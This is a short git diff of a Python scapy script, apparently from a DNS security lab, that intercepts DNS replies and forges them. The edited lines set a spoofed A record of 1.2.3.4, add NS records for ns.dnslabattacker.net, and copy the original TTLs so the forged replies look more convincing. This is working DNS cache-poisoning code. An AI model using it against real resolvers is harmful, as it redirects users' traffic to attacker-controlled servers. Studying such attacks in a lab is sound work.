@@ -36,21 +36,23 @@ while True:
         addr_port = addr[1]
         sock.sendto(data, (BIND_IP,dns_port))
     else:
-        print "send back:", packet.show()
+        #print "send back:", packet.show()
         if SPOOF:
             print "spoofing data"
             print packet[scapy.all.DNS].nscount
             if packet.haslayer(scapy.all.DNSRR):
                 qname = packet[scapy.all.DNSQR].qname
-                dns_response = scapy.all.DNSRR(rrname=qname,rdata="1.2.3.4")
+                an_ttl = packet[scapy.all.DNSRR].ttl
+                ns_ttl = packet['DNS'].ns.ttl
+                dns_response = scapy.all.DNSRR(rrname=qname,rdata="1.2.3.4",ttl=an_ttl)
                 packet.an = dns_response
-                ns_response = scapy.all.DNSRR(rrname=qname,type="NS",rdata="ns.dnslabattacker.net")/DNSRR(rrname=qname,type="NS",rdata="ns.dnslabattacker.net")
+                ns_response = scapy.all.DNSRR(rrname=qname,type="NS",rdata="ns.dnslabattacker.net",ttl=ns_ttl)/DNSRR(rrname=qname,type="NS",rdata="ns.dnslabattacker.net",ttl=ns_ttl)
                 packet.ns = ns_response
 
                 ip = packet.getlayer(IP)
                 dns = packet.getlayer(DNS)
                 pkt = DNS(id=dns.id,qd=dns.qd,nscount=2,an=DNSRR(rrname=dns.qd.qname, type='A', ttl=10,rdata='1.2.3.4'),ns=DNSRR(rrname=dns.qd.qname, type = 'NS', ttl=100,rdata="ns.dnslabattacker.net")/DNSRR(rrname=dns.qd.qname,type='NS',ttl=100,rdata="ns.dnslabattacker.net"))
-
+                #packet.show()
                 sock.sendto(bytes(packet), (addr_ip,addr_port))
 
 
